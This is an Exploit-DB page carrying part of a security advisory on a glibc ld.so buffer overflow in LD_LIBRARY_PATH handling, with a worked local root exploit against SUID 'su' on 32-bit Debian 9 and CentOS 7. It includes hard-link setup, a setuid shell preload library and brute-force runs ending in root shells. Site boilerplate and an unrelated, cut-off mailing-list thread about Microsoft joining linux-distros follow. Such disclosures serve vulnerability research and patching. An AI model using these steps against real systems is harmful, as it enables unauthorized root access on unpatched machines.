 812         malloc ((nllp + 1) * sizeof (struct r_search_path_elem *));
 ...
 819       (void) fillin_rpath (llp_tmp, env_path_list.dirs, ":;",
 820                            __libc_enable_secure, "LD_LIBRARY_PATH",
 821                            NULL, l);

Unfortunately, ld.so parses the "llp" string to compute "nllp" but
parses the "llp_tmp" string (an expanded copy of "llp") to fill in
"env_path_list.dirs". As a result, the number of pointers written to
"env_path_list.dirs" can be greater than "nllp + 1" (an mmap()-based
buffer overflow) if the contents of "llp_tmp" differ from the contents
of "llp" (if "llp_tmp" contains more colons than "llp"):

 784       /* Expand DSTs.  */
 785       size_t cnt = DL_DST_COUNT (llp, 1);
 786       if (__glibc_likely (cnt == 0))
 787         llp_tmp = strdupa (llp);
 788       else
 789         {
 790           /* Determine the length of the substituted string.  */
 791           size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
 792
 793           /* Allocate the necessary memory.  */
 794           llp_tmp = (char *) alloca (total + 1);
 795           llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
 796         }

The Dynamic String Tokens (DSTs) $LIB and $PLATFORM are expanded to
fixed strings that do not contain colons (typically "lib" and "i686" on
32-bit or "lib64" and "x86_64" on 64-bit), but the expansion of $ORIGIN
(the directory of the binary being executed) can inject extra colons
into "llp_tmp" and hence extra pointers into "env_path_list.dirs".

To exploit this buffer overflow, a local attacker must therefore be able
to:

- hard-link a SUID binary into a directory whose pathname contains
  colons (i.e., /proc/sys/fs/protected_hardlinks must not be enabled);

- pass the LD_LIBRARY_PATH environment variable to _dl_init_paths()
  (i.e., CVE-2017-1000366 must not be patched).

------------------------------------------------------------------------
History
------------------------------------------------------------------------

We tracked down this vulnerability to:

commit 950398e1320255572f4228db94344dcd5f613455
Date:   Tue Aug 29 01:44:27 2006 +0000

    * elf/dl-load.c (_dl_init_paths): Expand DSTs.

which added the expansion of llp's Dynamic String Tokens (DSTs) to
_dl_init_paths():

-      char *llp_tmp = strdupa (llp);
+      char *llp_tmp;
...
+      /* Expand DSTs.  */
+      size_t cnt = DL_DST_COUNT (llp, 1);
+      if (__builtin_expect (cnt == 0, 1))
+       llp_tmp = strdupa (llp);
+      else
+       {
+         /* Determine the length of the substituted string.  */
+         size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
+
+         /* Allocate the necessary memory.  */
+         llp_tmp = (char *) alloca (total + 1);
+         llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
+       }

========================================================================
Exploitation
========================================================================

------------------------------------------------------------------------
Debian 9 (i386)
------------------------------------------------------------------------

In this example, we exploit the SUID-root binary "su" on a 32-bit Debian
9.0: we installed "debian-9.0.0-i386-xfce-CD-1.iso" (the last release
before glibc's CVE-2017-1000366 was patched), and manually disabled
protected_hardlinks ("echo 0 > /proc/sys/fs/protected_hardlinks").

1/ First, we identify the system's trusted directories (the only
directories accepted by fillin_rpath() when executing a SUID binary):

$ env -i LD_PRELOAD=nonexistent LD_HWCAP_MASK=0 LD_DEBUG=libs env 2>&1 | head
      1607:     find library=nonexistent [0]; searching
      1607:      search cache=/etc/ld.so.cache
      1607:      search path=/lib/i386-linux-gnu/tls/i686:/lib/i386-linux-gnu/tls:/lib/i386-linux-gnu/i686:/lib/i386-linux-gnu:/usr/lib/i386-linux-gnu/tls/i686:/usr/lib/i386-linux-gnu/tls:/usr/lib/i386-linux-gnu/i686:/usr/lib/i386-linux-gnu:/lib/tls/i686:/lib/tls:/lib/i686:/lib:/usr/lib/tls/i686:/usr/lib/tls:/usr/lib/i686:/usr/lib            (system search path)
      1607:       trying file=/lib/i386-linux-gnu/tls/i686/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/tls/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/i686/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/tls/i686/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/tls/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/i686/nonexistent

The "system search path" line shows four system directories:
"/lib/i386-linux-gnu", "/usr/lib/i386-linux-gnu", "/lib", and "/usr/lib"
("tls" and "i686" are default hardware capabilities that are enabled
even if LD_HWCAP_MASK is 0).

2/ Second, we create our $ORIGIN directory and hard-link the SUID-root
binary "su" into it:

$ mkdir -p '/var/tmp/:/lib:/usr/lib:'

$ cd '/var/tmp/:/lib:/usr/lib:'

$ ln `which su` .

The pathname of our $ORIGIN directory contains two system directories:
we will write 12 bytes (3 pointers: one for each system directory, plus
a terminating NULL pointer) to an 8-byte "env_path_list.dirs" ("nllp" is
only 1, because our unexpanded LD_LIBRARY_PATH does not contain colons).
In other words, we will overflow "env_path_list.dirs" and write 4 bytes
(the terminating NULL pointer) out of bounds.

3/ Third, we overwrite this out-of-bounds NULL pointer with the first
bytes of an error message ("cannot open shared object file") that is
malloc()ated after "env_path_list.dirs" because of our "nonexistent"
preload library. Consequently, ld.so crashes when open_path() tries to
open our second preload library "rootshell.so" in a directory described
by an "r_search_path_elem" structure located at the unmapped address
0x6e6e6163 (the overwritten NULL pointer):

$ env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

$ dmesg | tail -n 1
[70632.888695] su[2293]: segfault at 6e6e6173 ip b77e1c43 sp bfc946dc error 4 in ld-2.24.so[b77db000+22000]

The "/../../../../../../../../$LIB" suffix is required, to pass the
"check_for_trusted" test in _dl_dst_substitute() (our expanded
LD_LIBRARY_PATH must be rooted in one of the system's trusted
directories).

4/ Next, we copy the library dependencies of "su" to our current working
directory, and compile our preload library "rootshell.so" ("la.c" can be
found at the beginning of our stack-clash exploit "Linux_ldso_hwcap.c"):

$ cp -- `ldd ./su | grep ' => /' | awk '{print $3}'` .

$ cat > la.c << "EOF"
> static void __attribute__ ((constructor)) _init (void) {
>     ...
>     // setuid(0);
>     ...
>     // execve("/bin/sh");
>     ...
> }
> EOF
$ gcc -fpic -shared -nostdlib -Os -s -o rootshell.so la.c

$ chmod u+s rootshell.so

This "chmod" is required, to pass the SUID-bit test in open_path().

5/ Last, we run "su" with an increasing number of hardware capabilities
(i.e., with an increasingly large "rtld_search_dirs.dirs[0]"), until the
"rtld_search_dirs.dirs[0]" occupies the address 0x6e6e6163. Because this
"rtld_search_dirs.dirs[0]" is mostly filled with null bytes, and because
an "r_search_path_elem" structure filled with null bytes is equivalent
to the current working directory in open_path(), ld.so will eventually
load and execute our "rootshell.so" from the current working directory:

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<16)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m0.715s
user    0m0.120s
sys     0m0.588s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<17)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m1.443s
user    0m0.368s
sys     0m1.072s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<18)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m2.840s
user    0m0.656s
sys     0m2.172s

...

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<23)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m5.778s
user    0m1.200s
sys     0m4.576s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<24)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m11.589s
user    0m2.520s
sys     0m9.060s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<25)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
# id; exit
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(user)

real    0m28.050s
user    0m6.140s
sys     0m21.892s

6/ Improvements in the running time of this exploit are left as an
exercise for the interested reader:

$ env -i LD_LIBRARY_PATH=. LD_PRELOAD=nonexistent LD_HWCAP_MASK="$(((1<<25)-1))" LD_DEBUG=libs env 2>&1 | head -c 1000
      3084:     find library=nonexistent [0]; searching
      3084:      search path=./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/vme/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/vme:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/de/vme/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mc

$ mkdir -p './tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme/fpu'

$ mv -- *.so* './tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme/fpu'

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<25)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
# id; exit
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(user)

real    0m23.485s
user    0m5.244s
sys     0m18.220s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='os-release:rootshell.so' LD_HWCAP_MASK="$(((1<<25)-1))" ./su
ERROR: ld.so: object 'os-release' from LD_PRELOAD cannot be preloaded (invalid ELF header): ignored.
# id; exit
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(user)

real    0m11.352s
user    0m2.844s
sys     0m8.388s

------------------------------------------------------------------------
CentOS 7 (i386)
------------------------------------------------------------------------

In this example, we exploit "su" on a 32-bit CentOS 7.3.1611: we
installed "CentOS-7-i386-Minimal-1611.iso" (the last release before
CVE-2017-1000366 was patched), and manually disabled protected_hardlinks
("echo 0 > /proc/sys/fs/protected_hardlinks").

$ env -i LD_PRELOAD=nonexistent LD_HWCAP_MASK=0 LD_DEBUG=libs env 2>&1 | head
     17896:     find library=nonexistent [0]; searching
     17896:      search cache=/etc/ld.so.cache
     17896:      search path=/lib/tls/i686:/lib/tls:/lib/i686:/lib:/usr/lib/tls/i686:/usr/lib/tls:/usr/lib/i686:/usr/lib                (system search path)
     17896:       trying file=/lib/tls/i686/nonexistent
     17896:       trying file=/lib/tls/nonexistent
     17896:       trying file=/lib/i686/nonexistent
     17896:       trying file=/lib/nonexistent
     17896:       trying file=/usr/lib/tls/i686/nonexistent
     17896:       trying file=/usr/lib/tls/nonexistent
     17896:       trying file=/usr/lib/i686/nonexistent

$ mkdir -p '/var/tmp/:/lib:/usr/lib:'

$ cd '/var/tmp/:/lib:/usr/lib:'

$ ln `which su` .

$ env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

$ dmesg | tail -n 1
[ 8414.911000] su[18088]: segfault at 6e6e6173 ip b77645e2 sp bfe0cb40 error 4 in ld-2.17.so[b775f000+1f000]

$ cp -- `ldd ./su | grep ' => /' | awk '{print $3}'` .

$ cat > la.c << "EOF"
> static void __attribute__ ((constructor)) _init (void) {
>     ...
>     // setuid(0);
>     ...
>     // execve("/bin/sh");
>     ...
> }
> EOF
$ gcc -fpic -shared -nostdlib -Os -s -o rootshell.so la.c

$ chmod u+s rootshell.so

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<16)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m0.527s
user    0m0.085s
sys     0m0.441s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<17)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m1.060s
user    0m0.182s
sys     0m0.877s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<18)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m2.093s
user    0m0.384s
sys     0m1.702s

...

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<25)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m17.071s
user    0m2.525s
sys     0m14.537s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<26)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m33.926s
user    0m5.464s
sys     0m28.429s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<27)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
sh-4.2# id; exit
uid=0(root) gid=0(root) groups=0(root),1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

real    1m30.604s
user    0m16.169s
sys     1m14.395s

========================================================================
Acknowledgments
========================================================================

We thank the members of the linux-distros@openwall list.

```

**Tags:**
[Local](/?tag=22)

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)


[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database



[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as Google Hacking was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnnys talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term Googledork to refer
to a foolish or inept person as revealed by Google. This was meant to draw attention to
the fact that this was not a Google problem but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term dork became shorthand for a search query that located sensitive
information and dorks were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources



| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database



Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from www.openwall.com_cdd9d9ba_20250126_004326.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists  *for password cracking*](/wordlists/)+ [passwdqc  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt  *KDF & password hashing*](/yescrypt/)+ [yespower  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish  *password hashing*](/crypt/)+ [phpass  *ditto in PHP*](/phpass/)+ [tcb  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd  *port scan detector*](/scanlogd/)+ [popa3d  *tiny POP3 daemon*](/popa3d/)+ [blists  *web interface to mailing lists*](/blists/)+ [msulogin  *single user mode login*](/msulogin/)+ [php\_mt\_seed  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](6) [[next>]](8) [[<thread-prev]](6) [[thread-next>]](8) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20190627170508.GB11506@sasha-vm>
Date: Thu, 27 Jun 2019 13:05:08 -0400
From: Sasha Levin <sashal@...nel.org>
To: oss-security@...ts.openwall.com
Subject: Re: linux-distros membership application - Microsoft

On Thu, Jun 27, 2019 at 04:03:21PM +0200, Solar Designer wrote:
>Hi Sasha,
>
>Thank you for posting this application.
>
>Are you also on security@...?  If so, then on one hand also being on
>linux-distros would probably be of less use to you since I suspect most
>of the issues relevant to Microsoft are in the Linux kernel, but on the
>other hand you could serve as a liaison to that group.

I'm not a member of security@k.o, but that list isn't what we're looking
for. We've talked about this with Greg before sending this application,
and he has pointed out that security@k.o is not a disclosure list, but
rather just a way to pull in kernel folks to fix issues. Some (most?) of
the kernel bugs that get fixed don't go through that list to begin with.

The kernel's documentation with regards to security issues and
disclosure actually points to linux-distros:
<https://www.kernel.org/doc/Documentation/admin-guide/security-bugs.rst> .

To complicate your question further: the Linux usage on our cloud has
surpassed Windows, as a by-product of that MSRC has started receiving
security reports of issues with Linux code both from users and vendors.
It's also the case that issues that are common for Windows and Linux
(like those speculative hardware bugs) are shared with us via MSRC as
well.

If you think that there's value in connecting between these 3
entities, I'd be happy to do so (maybe as part of a new task).

>On Wed, Jun 26, 2019 at 10:13:58AM -0400, Sasha Levin wrote:
>> >1. Be an actively maintained Unix-like operating system distro with
>> >substantial use of Open Source components
>>
>> Microsoft provides several distro-like builds which are not derivative
>> of an existing distribution that are based on open source components:
>>
>> - Azure Sphere
>>   (<https://azure.microsoft.com/en-us/services/azure-sphere/>): This
>>   Linux-based IoT device provides, among various things, security
>>   updates to deployed IoT devices. As the project is about to step out
>>   of public preview into the GA stage, we expect millions of these
>>   devices to be publicly used.
>
>This does sound like it includes a Linux distro, but obviously there's
>no security track record for it yet, so it's hard to estimate relevance
>of information you'd obtain via linux-distros to that product.

Indeed. When we debated linux-distros application internally, I tried to
do this estimate based on issues previously handled by linux-distros,
and it seemed like it would be valuable here.

With Sphere it's also hard to guess how are customers will be using it,
it's a rather unique mix of HaaS (the chip contains cores that would
belong to the user) and SaaS (where we provide mechanism to manage the
IoT device that the user will build on). I can go over this in more
detail if you'd like.

>> - Windows Subsystem for Linux v2
>>   (<https://devblogs.microsoft.com/commandline/wsl-2-is-now-available-in-windows-insiders/>):
>>   A Linux based distro that runs as a virtual machine on top of Windows
>>   hosts. WSL2 is currently available for public preview and scheduled
>>   for GA early 2020.
>
>You call this "a Linux based distro", but that's not clear to me from
>the web page you reference, which talks about managing (third-party?)
>distros in the WSL2 subsystem.  Can you clarify this, please?

With WSLv2, users can choose to bring in a third party distro userspace
to run on top our kernel+lightweight userspace. This means that users
can be running a Debian/Ubuntu/Fedora/etc userspace modified to run on
WSLv2, on top of a kernel we supply.

For us it means that we are now the proud owners of multiple
frankensteined distro userspaces as well as a custom kernel. You might
call it out as being derivative of those distros, but I believe that at
the very least this is similar to the OpenVZ/CloudLinux scenario.

>> - Products such as Azure HDInsight
>>   (<https://azure.microsoft.com/en-us/free/hdinsight>) and the Azure
>>   Kubernetes Service
>>   (<https://azure.microsoft.com/en-us/services/kubernetes-service/>)
>>   provide public access to a Linux based distribution.
>
>These look like SaaS offerings.  We do not have any explicit guidelines
>on whether "provide public access to a Linux based distribution" is
>potentially enough to qualify for linux-distros or not.  We do have
>Amazon as a member, so there's that precedent.

Honestly, these ones are even harder to deal with than the regular IaaS
offerings we have: customers who use these offerings expect (and
rightfully so) to be able to boot/update into a secure environment
moments after a public disclosure of a security issue, which is not
something we are able to provide right now.

>> >2. Have a userbase not limited to your own organization
>>
>> Microsoft customers have millions of cores running the various workloads
>> described above.
>>
>> >3. Have a publicly verifiable track record, dating back at least 1
>> >year and continuing to present day, of fixing security issues
>> >(including some that had been handled on (linux-)distros, meaning that
>> >membership would have been relevant to you) and releasing the fixes
>> >within 10 days (and preferably much less than that) of the issues
>> >being made public (if it takes you ages to fix an issue, your users
